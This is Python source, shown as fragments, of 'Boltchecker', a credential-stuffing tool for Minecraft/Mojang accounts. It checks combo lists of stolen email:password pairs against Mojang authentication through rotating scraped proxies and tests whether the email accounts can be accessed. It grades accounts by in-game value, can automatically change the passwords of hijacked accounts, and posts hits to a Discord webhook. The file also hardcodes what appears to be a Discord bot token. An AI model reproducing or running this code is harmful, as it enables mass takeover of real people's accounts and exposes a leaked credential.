...
while True:
                try:
                            with open('config\config.yml', 'r', errors='ignore') as config1:
                                config = yaml.load(config1, Loader=yaml.FullLoader)
                                break
...
class Main:
                def __init__(self):
                                ...
                                self.hits = Queue()
                                self.bad = Queue()
                                self.useragent = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36'}
...
''')
                                 ...
                                 if mod == "1":
                                  ...
                                  if register_status == 0:
                                          ...
                                          try:     
                                           with requests.Session() as sess:
                                            ...
                                            request_3 = sess.post('https://api.auth.gg/version2/api.php',  verify=False,data=data, headers=headers, timeout=10)
                                            response_3 = request_3.text
                                            flag3 = (response_3 == request_3.text)
                                            if flag3:
                                             if "success" in response_3:
                                                     print("\n{}, Welcome To Boltchecker".format(username))
                                                     time.sleep(2)
                                                     system('clear')
                                                     Main()
                                             else:
                                  ...
                                  if login_status == 0:
                                         ...
                                         print(f'{Fore.RED}|{Fore.LIGHTWHITE_EX}This tool was coded by {Fore.GREEN}Sharkdance#0001')
                                         print(f'{Fore.RED}|{Fore.LIGHTWHITE_EX}Bored bored bored bored\n')
                                         system('clear')
                                         print(self.t)
                                         if Checker.auto_login:
                                                 print(f'{Fore.MAGENTA}Logging in with credentials from config...')
                                ...
                                if self.version == self.version:
                                                         ...
                                                         if Checker.RPC.discordrpc:
                                                          ...
                                                          rpc.close
                                                          rpc.connect()
                                                          rpc.update(large_image = 'large', large_text = 'Boltchecker', state = 'In the menu')
                                                          if Checker.RPC.rpcd:
...
''')
                                ...
                                if mode == "4":
                                                ...
                                                def proxy_check(proxy):
                                                                ...
                                                                try:
                                                                        ...
                                                                        if 'URI' in r:
                                                                           ...
                                                                           Counter.total += 1
                                                                           open(f'{savepath}/Unbanned.txt' , 'a', encoding='u8').write(f'{proxy[0]}\n') 
                                                                           self.prints(f'{Fore.LIGHTGREEN_EX}Mojang unbanned | {proxy[0]} | {_type}')
                                                                           rpc.update(large_image = 'large', large_text = 'Boltchecker', state = 'Checking | Boltproxy', details = f'Unbanned: {Counter.mojangunbanned} Bad: {Counter.invalid}')
                                                                        else:
                                                                                open(f'{savepath}/Bad.txt' , 'a', encoding='u8').write(f'{proxy[0]}\n') 
                                                                                Counter.total += 1
                                                                                Counter.invalid += 1
                                                                except:
                                                                        open(f'{savepath}/Bad.txt' , 'a', encoding='u8').write(f'{proxy[0]}\n') 
                                                ...
                                                if __name__ == '__main__':
                                                                ...
                                                                _type = str(input(f'{Fore.YELLOW}[ProxyChecker] Proxy type: {Fore.CYAN}(HTTPS SOCKS4 SOCKS5):{Fore.YELLOW} ')).lower().strip()
                                                                ...
                                                                if Checker.RPC.discordrpc:
                                                                 rpc.update(large_image = 'large', large_text = 'Boltchecker', state = 'Checking Proxies | Boltproxy', details = f'Unbanned: {Counter.mojangunbanned} Bad: {Counter.invalid}')
                                                                ...
                                                                print(self.t)
                                                                if Checker.RPC.discordrpc:
                                                                 rpc.update(large_image = 'large', large_text = 'Boltchecker', state = 'Done Checking | Boltproxy', details = f'Unbanned: {Counter.mojangunbanned} Bad: {Counter.invalid}')
                                                                 if Checker.RPC.rpcd:
                                                                  print('Updated RPC')
                                                                ...
                                                                print(f'{Fore.CYAN}')
                                                                print(f'-- {Fore.CYAN}Proxies Loaded: {Counter.total}{Fore.CYAN}')
                                                                print(f'-- {Fore.GREEN}Good Proxies: {Counter.mojangunbanned}{Fore.CYAN}')
                                                                print(f'-- {Fore.RED}Bad/Banned Proxies: {Counter.invalid}{Fore.CYAN}')
                                                                print(f'{Fore.CYAN}')
                                                ...
                                                def check_ban(username, password, proxy_addr, proxy_port, proxy_type, output_file):
                                                                ...
                                                                while True:
                                                                                try:
                                                                                                ...
                                                                                                r = scraper.post('https://authserver.mojang.com/authenticate', json=data, headers=headers, proxies=requests_proxy, timeout=20)
                                                                                                if 'selectedProfile' in r.text:
                                                                                                                ...
                                                                                                                if proxy_failed[proxy_addr] > 5:
                                                                                                                                if {'address': proxy_addr, 'port': proxy_port} in proxies:
                                                                                                                                                proxies.remove({'address': proxy_addr, 'port': proxy_port})
                                                                                                else:
                                                                                                                rechecked += 1
                                                                ...
                                                                if proxy_type == 'socks4':
                                                                                sock.set_proxy(socks.SOCKS4, proxy_addr, int(proxy_port), False)
                                                                ...
                                                                while True:
                                                                                ...
                                                                                if res['name'] == 'Encryption Request':
                                                                                                ...
                                                                                                pubkey = load_der_public_key(res['public_key'], default_backend())
                                                                                                encrypted_shared_secret = pubkey.encrypt(shared_secret, PKCS1v15())
                                                                                                encrypted_verify_token = pubkey.encrypt(res['verify_token'], PKCS1v15())
                                                                                                hash = sha1()
                                                                                                hash.update(res['server_id'].encode('utf-8'))
                                                                                                hash.update(shared_secret)
                                                                                                hash.update(res['public_key'])
                                                                                                server_id = format(int.from_bytes(hash.digest(), byteorder='big', signed=True), 'x')
                                                                                                data = {
                                                                                                ...
                                                                                                while (True):
                                                                                                                try:
                                                                                                                                r = scraper.post('https://sessionserver.mojang.com/session/minecraft/join', json=data, headers=headers, proxies=requests_proxy, timeout=20)
                                                                                                                                break
                                                                                                                except:
                                                                                                                                proxy_failed[proxy_addr] += 1
                                                                                                                                if proxy_failed[proxy_addr] > 5:
                                                                                                ...
                                                                                                if r.status_code == 204:
                                                                                                                encryption_response(sock, encrypted_shared_secret, encrypted_verify_token)
                                                                                                                ...
                                                                                                                file_object = EncryptedFileObject(file_object, decryptor)
                                                                                                                try:
                                                                                                                                res = read_packet(file_object)
                                                                                                                                break
                                                                                                                except:
                                                ...
                                                if __name__ == '__main__':
                                                                ...
                                                                while (flag):
                                                                                print(f'{Fore.MAGENTA}')
                                                                                alts_file = input(f'{Fore.CYAN}Accounts file eg: alts.txt:')
                                                                                                ...
                                                                                                with open(alts_file, 'r') as f:
                                                                                                                for alt in f.readlines():
                                                                                                                                ...
                                                                                                                                if len(alt) >= 2:
                                                                                                                                                ...
                                                                                                                                                alts.append({'email': email, 'password': password})
                                                                                                                print(f'{Fore.GREEN}Loaded: %d Accounts' % len(alts))
                                                                                                                flag = False
                                                                                else:
                                                                                                print(f'{Fore.LIGHTRED_EX}File not found!')
                                                                flag = True
                                                                while (flag):
                                                                                proxies_file = input(f'{Fore.CYAN}Proxy file eg: proxies.txt:')
                                                                                if os.path.exists(proxies_file) and os.path.isfile(proxies_file):
                                                                                                with open(proxies_file, 'r') as f:
                                                                                                                ...
                                                                                                                print(f'{Fore.GREEN}Loaded: %d Proxies' % len(proxies))
                                                                                                                flag = False
                                                                                else:
                                                                                                print(f'{Fore.LIGHTRED_EX}File not found!')
                                                                flag = True
                                                                while (flag):
                                                                                proxies_type = input(f'{Fore.CYAN}Proxy type: socks4 / socks5 / http:')
                                                                                if proxies_type != 'socks4' and proxies_type != 'socks5' and proxies_type != 'http':
                                                                                                print('Choose one of the following: socks4 / socks5 / http')
                                                                                else:
                                                                                                print(f'{Fore.GREEN}Set the proxy type to: %s' % proxies_type)
                                                                                                flag = False
                                                                flag = True
                                                                while (flag):
                                                                                thread_num = int(input(f'{Fore.MAGENTA}How many threads?:'))
                                                                                if thread_num <= 0:
                                                                ...
                                                                output = input(f'{Fore.YELLOW}File to save unbanned accounts eg: unbanned.txt:')
                                                                system('clear')
                                                                print(self.t)
                                                                if Checker.RPC.discordrpc:
                                                                 rpc.update(large_image = 'large', large_text = 'Boltchecker', state = 'Checking | BanChecker', details = f'Server: {SERVER} |  Retries: {RETRIES}')
                                                                 if Checker.RPC.rpcd:
                                                                  print('Updated RPC')
                                                                print(f'{Fore.CYAN}-- Server: {SERVER}')
                                                                print(f'{Fore.CYAN}-- Port: {PORT}')
                                                                print(f'{Fore.CYAN}-- Retries: {RETRIES}\n')
                                                                print(f'{Fore.MAGENTA}Might take a while for results to appear if using free proxies \n')
                                                                if Checker.bot.discord_bot:
                                                                  Thread(target=self.bancheckerbot, daemon=True).start()
                                                                tasks = []
                                                                for alt in alts:
                                                                                proxy = random.choice(proxies)
                                                                                tasks.append(executor.submit(check_ban, alt['email'], alt['password'], proxy['address'], proxy['port'], proxies_type, output))
...
''')
                                   while True:
                                    ...
                                    if option in ("1", "2", "3", "4", "5", "6", "8", "9", "10", "11", "12"):
                                        while True:
                                                   ...
                                                   self.file = input(f'{Fore.CYAN}[ComboEditor] Combo file:')
                                  ...
                                  if not path.exists('Urls.txt'):
                                    ...
                                    file.write("") 
                                    file.close() 
                                  print(f'{Fore.CYAN}Press ENTER to start scraping (make sure your urls are in urls.txt)')
                                  input('')
                                  import requests
                                  urls = []
                                  proxies = []
                                  ...
                                  urlss = open('urls.txt', 'r', encoding='u8', errors='ignore').read().split('\n')
                                  improvedurls = [x for x in urlss if x != '' and 'http' in x]
                                  for line in improvedurls:
                                    urls.append(line)
                                  while True:
                                    currentnumber = open('Scraped.txt', 'r', encoding='u8', errors='ignore').read().split('\n')
                                    ...
                                    for line in lol:
                                      proxies.append(line)
                                      scrapedproxies = [x for x in proxies if x != '' and ':' in x and 'a' not in x and 'b' not in x and 'c' not in x and 'd' not in x and 'e' not in x and 'f' not in x and 'g' not in x and 'h' not in x and 't' not in x]
                                  ...
                                  Main()
                                        ...
                                        system('clear')
                                        print(self.t)
                                        urls = ['https://api.proxyscrape.com/?request=getproxies&proxytype=socks4&timeout=10000&country=all']
                                        ...
                                        if Checker.RPC.discordrpc:
                                                rpc.update(large_image = 'large', large_text = 'Boltchecker', details = ' Scraping Proxies | BoltProxy')
                                                if Checker.RPC.rpcd:
                                                    print('Updated RPC')
                                        ...
                                        while True:
                                          ...
                                          if len(urls) > 0:
                                            ...
                                            break
                                        if Checker.RPC.discordrpc:
                                                rpc.update(large_image = 'large', large_text = 'Boltchecker', details = ' Done Scraping | BoltProxy')
                                                                                                        ...
                                                                                                        while True:
                                                                                                         try:
                                                                                                                ...
                                                                                                                if 'Ok=1' in ans:
                                                                                                                        ...
                                                                                                                        open(f'{savepath}/MA.txt' , 'a', encoding='u8').write(f'{account}\n') 
                                                                                                                        print(f'{Fore.LIGHTGREEN_EX}[MA] - {account}')
                                                                                                                        break
                                                                                                                elif 'Ok=0' in ans:
                                                                                                                        counter.bad += 1
                                                                                                                        counter.untilsleep += 1
                                                                                                                        open(f'{savepath}/BAD.txt' , 'a', encoding='u8').write(f'{account}\n') 
                                                                                                                        print(f'{Fore.LIGHTRED_EX}[BAD] - {account}')
                                                                                                                        break
                                                                                                                else:
                                                                                                                        counter.bad += 1
                                                                                                                        counter.untilsleep += 1
                                        ...
                                        if __name__ == '__main__':
                                         system('clear')
                                         print(self.t)
                                         mailfile = input(f'{Fore.CYAN}[MailAccess] Accounts file eg combos.txt: ')
                                         self.combolist = open(mailfile, 'r', encoding='u8', errors='ignore').read().split('\n')
                                ...
                                while True:
                                                                ...
                                                                if read_files == '[]':
                                                                        print(f'{Fore.YELLOW}No Combos files found in directory please put your combos in there and try again')
                                                                        input(f'{Fore.CYAN}Press ENTER when you have done that')
                                                                        continue
                                                                self.combolist = []
                                                                for file in read_files:
                                                                        combolistt = open(file, 'r', encoding='u8', errors='ignore').read().split('\n')
                                ...
                                print(f'{Fore.LIGHTCYAN_EX}Are you happy with this config? (y to start checking n to edit)')
                                edit = input('> ')
                                if 'n' in edit: 
                                 system('clear')
                                 print(self.t)
                                 print(f'{Fore.CYAN}[Config] Ok lets edit your config then\n')
                                 print(f'{Fore.CYAN}[Config] Would you like to use proxies for checking? True/False')
                                 lol = input('> ')
                                 if lol == 'True':
                                 ...
                                 if Checker.Proxy.proxy == True:
                                         print(f'{Fore.CYAN}[Config] What type of proxy are you using? socks4|socks5|http')
                                         self.proxy_type = str(input('> '))
                                         print(f'{Fore.CYAN}[Config] Proxy Type set to {self.proxy_type}')
                                 print(f'{Fore.CYAN}[Config] How many threads would you like to use? (max 1000)')
                                 Checker.threads = int(input('> '))
                                 print(f'{Fore.CYAN}[Config] Threads set to {Checker.threads}')
                                 print(f'{Fore.CYAN}[Config] What would you like your Proxy timeout to be? (in seconds)')
                                 Checker.timeout = int(input('> '))
                                 print(f'{Fore.CYAN}[Config] Proxy timeout set to {Checker.timeout}')
                                ...
                                if Checker.Proxy.proxy == True:
                                                while True:
                                                                                ...
                                                                                if read_files == '[]':
                                                                                        print(f'{Fore.YELLOW}No Proxies files found in directory please put your proxies in there and try again')
                                                                                        input(f'{Fore.CYAN}Press ENTER when you have done that')
                                                                                        continue
                                                                                self.proxylist = []
                                                                                for file in read_files:
                                                                                        proxylistt = open(file, 'r', encoding='u8', errors='ignore').read().split('\n')
                                ...
                                if Checker.Proxy.proxy == True:
                                  if not self.proxyapi:
                                   duplicatesr = input('Would you like to remove proxy duplicates?(y/n): ')
                                   if duplicatesr == 'y':
                                    withoutremoved = len(self.proxylist)
                                    print(f'{Fore.CYAN}Importing proxies....\n')
                                    self.proxylist = list(set([x.strip() for x in self.proxylist if ":" in x and x != '']))#
                                    ...
                                    self.proxylist = requests.get(Checker.Proxy.proxy_api_link).text.split('\n')
                                    print(f'{Fore.GREEN}Imported {len(self.proxylist)} Proxy lines\n')
                                print(f'{Fore.MAGENTA}[Boltchecker] Starting Threads...\n')
                                self.dictorary = open('config\og-name.txt', 'a+', errors='ignore').read().split('\n')
                                ...
                                def updaterpc():
                                        while True:
                                         rpc.update(large_image = 'large', large_text = 'Boltchecker', state = 'Checking Accounts', details = f'Bad: {Counter.bad} Hits: {Counter.hits} CPM: {Counter.cpm}')
                                         sleep(10)
                                         continue
                                self.accounts = [x for x in self.combolist if x != '' and ':' in x]
                                ...
                                if 'y' == self.cuimode:
                                        ...
                                        if Checker.RPC.discordrpc:
                                                rpc.update(large_image = 'large', large_text = 'Boltchecker', details = 'Checking Accounts | CUI Mode')
                                else:
                                        if Checker.RPC.discordrpc:
                                                rpc.update(large_image = 'large', large_text = 'Boltchecker', details = 'Checking Accounts | Normal Mode')
                                ...
                                print(f'{Fore.CYAN}-- PasswordChanger: {Checker.PasswordChanger.passwordchanger:}\n')
                                try:
                                        ...
                                        try:
                                                ...
                                                if vaildalt:
                                                                ...
                                                                if sfacheck == '[]':
                                                                                ...
                                                                                if Checker.PasswordChanger.passwordchanger:
                                                                                        ...
                                                                                        try:
                                                                                         ...
                                                                                         open(f'{self.folder}/Changed_SFA.txt' , 'a', encoding='u8').write(f'{email}:{Checker.PasswordChanger.newpassword}\n') 
                                                                                                ...
                                                                                                self.prints(f'{Fore.RED}Error changing password {rip}')
                                                                                if Checker.webhook.webhooky:
                                                                                          self.webhooksend(f'[SFA] - {line} Username: {username}')
                                                                                ...
                                                                                if Checker.webhook.webhooky:
                                                                                 self.webhooksend(f'[NFA] - {line} Username: {username}')
                                                ...
                                                if vaildalt:
                                                        ...
                                                        response = requests.get(url=url, headers=self.mailheaders).text
                                                        if not 'No user with the name' in response:
                                                                if not 'Player has no SkyBlock profiles.' in response:
                                                                        self.prints(f'{Fore.CYAN}[Capture] Skyblock - {line}')
                                                                        ...
                                                                        if 'Bank Account' in response:
                                                                                ...
                                                                                bankbal = 'Hidden'
                                                                        bruh = re.search('class="stat-name">Purse:(.*)', response).group(1).split('</span><span class="stat-value">')
                                                                        kek = bruh[1].split('<')
                                                                        pursebal = kek[0]
                                                                        loll = re.search('class="stat-name">Joined: (.*)', response).group(1).split('</span><span class="stat-value">')
                                                                        ok = loll[1].split('</span></span></div>')
                                                                        joinedsky = ok[0]
                                                                        open(f'{self.folder}/Hypixel/SkyBlock/Stats.txt', 'a', encoding='u8').write(f'{line} | Bank: {bankbal} | Wallet: {pursebal} | Pets: {petnum} | Started: {joinedsky}\n')
                                                ...
                                                if vaildalt:
                                                                with ThreadPoolExecutor() as exe:
                                                                                ...
                                                                                mineplex = exe.submit(self.mineplex, username, line)
                                                                                ...
                                                                                mailaccess = exe.submit(self.mailaccesz, email, password)
                                                                                minecon = exe.submit(self.mojang, uuid, line, username)
                                                                                optifine = exe.submit(self.optifine, username, line)
                                                                                labycape = exe.submit(self.labymod, uuid, line, username)
                ...
                def securedcheck(self, token):
                                ...
                                try:
                                                if not Checker.Proxy.proxy:
                                                                ...
                                                                while True:
                                                                                try:
                                                                                                lol = scraper.get(url=self.secureurl, headers=headers, proxies=self.proxies()).text
                                                                                                break
                                                                                except (SocketError, SSLError, MaxRetryError, ProxyError, JSONDecodeError):
                                                                                                continue
                                                answer = lol
                ...
                def optifine(self, user, combo):
                                ...
                                if Checker.Cape.optifine:
                                                try:
                                                                optifine = requests.get(url=f'http://s.optifine.net/capes/{user}.png').text
                                                                if 'Not found' not in optifine:
                                                                                cape = True
                                                except Exception as e:
                                                                if self.debug:
                                                                                self.prints(f'{Fore.LIGHTRED_EX}Error Optifine:\n{e}{Fore.WHITE}')
                                                if cape:
                                                                Counter.optifine += 1
                                                                Counter.of += 1
                                                                self.prints(f'{Fore.CYAN}[Capture] - OF Cape | {combo}  {user}')
                ...
                def mojang(self, uuid, combo, user):
                                ...
                                if Checker.Cape.minecon:
                                                try:
                                                                mine = requests.get(url=f'https://api.ashcon.app/mojang/v2/user/{uuid}').text
                                                                if mine.__contains__('"cape"'):
                                                                                cape = True
                                                except Exception as e:
                                                                if self.debug:
                                                                                self.prints(f'{Fore.LIGHTRED_EX}Error MojangCape:\n{e}{Fore.WHITE}')
                                                if cape:
                                                                Counter.mojang += 1
                                                                Counter.mj += 1
                                                                self.prints(f'{Fore.CYAN}[Capture] - MJ Cape | {combo} Username: {user}{Fore.RESET}')
                ...
                def labymod(self, uuid, combo, user):
                                ...
                                if Checker.Cape.labymod:
                                                ...
                                                try:
                                                                ...
                                                                if self.debug:
                                                                                self.prints(f'{Fore.LIGHTRED_EX}Error Labymod:\n{e}{Fore.WHITE}')
                                                if cape:
                                                                Counter.lbm += 1
                                                                Counter.labymod += 1
                                                                self.prints(f'{Fore.CYAN}[Capture] - LBM Cape | {combo} Username: {user}')
                ...
                def hivemc(self, uuid, combo):
                                ...
                                if Checker.Rank.hivemc_rank:
                                                try:
                                                                response = requests.get(url=f'https://www.hivemc.com/player/{uuid}').text
                                                                ...
                                                                if self.debug:
                                                                                self.prints(f'{Fore.LIGHTRED_EX}Error HiveMC:\n{e}{Fore.WHITE}')
                                                if rank:
                                                                open(f'{self.folder}/HiveMC/Ranked.txt', 'a', encoding='u8').write(
                                                                                f'[{str(rank)}]{combo}  \n')
                                                                Counter.hivemcrank += 1
                                                                Counter.hr1 += 1
                                                                self.prints(f'{Fore.CYAN}[Capture] - Hive Ranked | [{str(rank)}] {combo}{Fore.RESET}')
                                                return rank
                ...
                def veltpvp(self, username, combo):
                                ...
                                if Checker.Rank.veltpvp_rank:
                                                try:
                                                                link = requests.get(url=f'https://www.veltpvp.com/u/{username}', headers=self.mailheaders).text
                                                ...
                                                if rank:
                                                                open(f'{self.folder}/VeltPVP/Ranked.txt', 'a', encoding='u8').write(f'{combo} | Rank: {rank}\n')
                                                                Counter.vr += 1
                                                                Counter.veltrank += 1
                                                                self.prints(f'{Fore.CYAN}[Capture] - Velt Ranked | [{rank}] {combo} Username: {username}{Fore.RESET}')
                                return rank
                ...
                def wynncraft(self, username, combo):
                                ...
                                if Checker.Rank.wynncraft_rank:
                                                try:
                                                                answer = requests.get(url=f'https://api.wynncraft.com/v2/player/{username}/stats').json()
                                                except Exception as e:
                                                                if self.debug:
                                                                                self.prints(f'{Fore.LIGHTRED_EX}Wynncraft API Error: \n{e}{Fore.WHITE}')
                                                if '400' not in str(answer):
                                                                rank = str(answer['rank'])
                                                                if rank != 'Player':
                                                                        if rank != 'False':
                                                                                Counter.wynncraft += 1
                                                                                self.prints(f'{Fore.CYAN}[Capture] -  Wynncraft Ranked [{rankk[0]}] {combo}{Fore.RESET}')
                ...
                def hypixel(self, uuid, combo):
                                ...
                                if self.hypr or self.hypl or Checker.Uhc.uhc or Checker.Bedwars.bedwars or Checker.Skywars:
                                                try:
                                                                ...
                                                                if self.debug:
                                                                                self.prints(f'{Fore.LIGHTRED_EX}Hypixel API Error: \n{e}{Fore.WHITE}')
                                                if not both[2]:
                                                                if both[3] >= self.uhcminc:
                                                                                if Checker.Uhc.uhc:
                                                                                 Counter.uhccoin += 1
                                                                                 open(f'{self.folder}/Hypixel/UHC/UHCCoins.txt', 'a', encoding='u8').write(f'[{both[3]}]{combo} \n')
                                                                if both[4] >= Checker.Skywars.scoins:
                                                                                if Checker.Skywars.skywars:
                                                                                 Counter.swcoin += 1
                                                                                 open(f'{self.folder}/Hypixel/SkyWars/SWCoins.txt', 'a', encoding='u8').write(f'[{both[4]}]{combo} \n')
                                                                if both[5] >= Checker.Bedwars.bwlevel:
                                                                                if Checker.Bedwars.bedwars:
                                                                                 Counter.bwcoin += 1
                                                                                 open(f'{self.folder}/Hypixel/BedWars/BWCoins.txt', 'a', encoding='u8').write(f'[{both[5]}]{combo} \n')
                                                if not both[2]:
                                                                if both[0] != 'None':
                                                                        rank = both[0]
                                                                        if (str(rank)) != 'False':
                                                                                ...
                                                                                Counter.hr += 1
                                                                                self.prints(f'{Fore.CYAN}[Capture] - Hypixel Ranked | [{both[0]}] {combo}{Fore.RESET}')
                                                                ...
                                                                if both[1] >= 1 and both[1] < 10:
                                                                 ...
                                                                 Counter.twenty +=1
                                                                 self.prints(f'{Fore.CYAN}[Capture] - Hypixel 25+ | {combo}{Fore.RESET}')
                                                                 open(f'{self.folder}/Hypixel/Level/25+.txt', 'a', encoding='u8').write(
                                                                                                f'[{str(both[1])}]{combo} \n')
                                                else:
                                                                self.prints(f'{Fore.CYAN}[Capture] - NoHypixel Login | {combo}{Fore.RESET}')
                                                                Counter.nohypixel += 1
                                                                open(f'{self.folder}/Hypixel/NoLogin.txt', 'a', encoding='u8').write(f'{combo}\n')
                                return both
                ...
                def mailaccesz(self, email, password):
                                ...
                                if Checker.emailaccess:
                                                ...
                                                if 'Ok=1' in ans:
                                                 ...
                                                 Counter.hits += 1
                                                 self.prints(f'{Fore.CYAN}[Capture] - MFA | {email}:{password}{Fore.RESET}')
                                                 open(f'{self.folder}/MFA.txt', 'a', encoding='u8').write(f'{email}:{password}\n')
                                return mailaccesz
                ...
                def advancedcounters(self):
                                while True:
                                                ...
                                                if Checked > 1:
                                                 ...
                                                 topkek = (ma1 + sf1 + nf1 + lbm1 + mj1 + pog1 + hr1 + hl1 + vr1 + hr2 - Checker.profit.pcombo)
                ...
                def webhooksend(self, line):
                        ...
                        while True:
                                ...
                                webhook = DiscordWebhook(url=f'{Checker.webhook.webhookid}', content=f'{line}')
                        ...
                        with open(self.file, 'r') as in_file, \
                         ...
                         for line in in_file:
                                if line.count(':') == 1:
                                        ...
                                        counter.badlines += 1
                         afterremove = open(output_file, 'r', encoding='u8', errors='ignore').read().split('\n') 
                         beforeremove = open(self.file, 'r', encoding='u8', errors='ignore').read().split('\n')
                         print(f'{Fore.CYAN}[ComboEditor] Removed Badlines, Saved in {output_file}')
                         print(f'{Fore.CYAN}[ComboEditor] Before: {len(beforeremove)} After: {len(afterremove)}\n')
                ...
                def split(self):
                                print('')
                                chunks = int(input(f'{Fore.CYAN}[ComboEditor] Amount of lines in each file:\n> '))
                ...
                def discordbot(self):
                                        ...
                                        async def resume(ctx):
                                                if ctx.message.author.id in users:
                                                        if self.Paused:
                                                         ...
                                                         self.prints(f'{Fore.MAGENTA}[Boltchecker] Checking Resumed')
                                                        else:
                                        ...
                                        async def fullstats(ctx):
                                                if ctx.message.author.id in users:
                                                                ...
                                                                await ctx.send('**Thank you for using BoltChecker**')
                                        client.run("ODA2NjY1NjUyODY1NTk3NDcx.YBsv7g.PgSscsbY2POF71asHeM8x_ZAemE")
                ...
                def combo(self):
                                ...
                                for ArrayItem in self.lines.readlines():
                                                match_list = findall(rf'{self.email}:[\w!@#$%^&*()''"-{}?;~:]+', ArrayItem)
                                                if len(match_list) > 0:
                                                ...
                                                for line in in_file:
                                                                ...
                                                                if ':' in line:
                                                                                ...
                                                                                with open(f'Results/Invalid{self.created}.txt', 'a') as invalid:
                                                                                                invalid.write(line)
                                                                                                w = line.replace('\n', '')
                                                unedited = open(self.file, 'r', encoding='u8', errors='ignore').read().split('\n')
                                                edited = open(f'Results/General{self.created}.txt', 'r', encoding='u8', errors='ignore').read().split('\n')
                                                print(f'{Fore.CYAN}[ComboEditor] Editing\n')
                                                self.general2()
                def general2(self):
                                system('clear')
                ...
                def general(self):
                                ...
                                with open(self.file, 'r') as in_file, \
                                                ...
                                                unedited = open(self.file, 'r', encoding='u8', errors='ignore').read().split('\n')
                                                edited = open(f'Results/General{self.created}.txt', 'r', encoding='u8', errors='ignore').read().split('\n')
                                                print(f'{Fore.CYAN}[ComboEditor] Done Editing, Made {len(edited)} Combos from {len(unedited)} Combos')
                                                input(f'{Fore.CYAN}[ComboEditor] Press ENTER to remove duplicates and randomize lines')                                                
                ...
                def generaldup(self):
                                ...
                                print(f'{Fore.CYAN}[ComboEditor] Removed Duplicates, Saved in {output_file}')
                                afterremove = open(output_file, 'r', encoding='u8', errors='ignore').read().split('\n')
                                beforeremove = open(f'Results/General{self.created}.txt', 'r', encoding='u8', errors='ignore').read().split('\n')
                                print(f'{Fore.CYAN}[ComboEditor] Before: {len(beforeremove)} After: {len(afterremove)}\n')
                                input(f'{Fore.LIGHTCYAN_EX}[Menu] Press ENTER to get back to the menu')
                                system('clear')
                                Main()                                
                                                ...
                                                for line in in_file:
                                                                ...
                                                                if ':' in line:
                                                                                ...
                                                                                with open(f'Results/Invalid{self.created}.txt', 'a') as invalid:
                                                                                                ...
                                                                                                w = line.replace('\n', '')
                                                unedited = open(self.file, 'r', encoding='u8', errors='ignore').read().split('\n')
                                                edited = open(f'Results/MinecraftEdits{self.created}.txt', 'r', encoding='u8', errors='ignore').read().split('\n')
                                                print(f'{Fore.CYAN}[ComboEditor] Editing\n')
                                                self.password2()
                def password2(self):
                                system('clear')
                ...
                def sort1(self):
                                ...
                                print(f'{Fore.CYAN}[ComboEditor] Removed Duplicates, Saved in {output_file}')
                                afterremove = open(output_file, 'r', encoding='u8', errors='ignore').read().split('\n')
                                beforeremove = open(f'Results/MinecraftEdits{self.created}.txt', 'r', encoding='u8', errors='ignore').read().split('\n')
                                print(f'{Fore.CYAN}[ComboEditor] Before: {len(beforeremove)} After: {len(afterremove)}\n')
                                input(f'{Fore.LIGHTCYAN_EX}[Menu] Press ENTER to get back to the menu')
                                system('clear')
                                Main()                                                
                def mineplex(self, username, combo):
                        ...
                        if Checker.Rank.mineplex_rank or Checker.Level.mineplex:
                                ...
                                if both[0]:
                                        ...
                                        self.prints(f'{Fore.CYAN}[Capture] - Mineplex ranked | [{both[0]}] {combo}{Fore.RESET}')
                                        open(f'{self.folder}/Mineplex/Ranked.txt', 'a', encoding='u8').write(f'[{both[0]}] {combo}  \n')
                                        if both[1] and Checker.Rank.mineplex_rank:
                                                if both[1] >= Checker.Level.mineplex_level:
                                                        Counter.mineplex_leveled += 1
                                                        self.prints(f'{Fore.CYAN}[Capture] - Mineplex level | [{str(both[1])}] {combo}')
                                                        open(f'{self.folder}/Mineplex/Highlevel.txt', 'a', encoding='u8').write(f'[{str(both[1])}] {combo} \n')
                        return both
                  ...
                  while True:
                    if not self.proxyapi:
                      ...
                      for file in read_files:
                            ...
                            for line in proxylistt:
                              self.proxylist.append(f'{line}')
                            print(f'{Fore.CYAN}[Proxy] Proxies Refreshed there are now {len(self.proxylist)}')
                            sleep(60)
                            continue
...
class Checker:
        try:
                ...
                class PasswordChanger:
                                passwordchanger = bool(config['checker']['passwordchanger']['autochange'])
                                newpassword = str(config['checker']['passwordchanger']['new_password'])
        except KeyError:
